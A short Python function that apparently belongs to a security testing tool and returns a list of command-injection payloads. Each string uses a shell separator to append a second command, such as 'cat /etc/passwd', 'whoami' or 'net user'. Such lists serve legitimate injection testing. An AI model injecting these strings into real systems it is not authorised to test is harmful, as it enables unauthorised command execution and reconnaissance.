def generate_payloads():
    return [
        "; ls -la",
        "&& whoami",
        "| cat /etc/passwd",
        "& net user",
        "|| dir"
    ]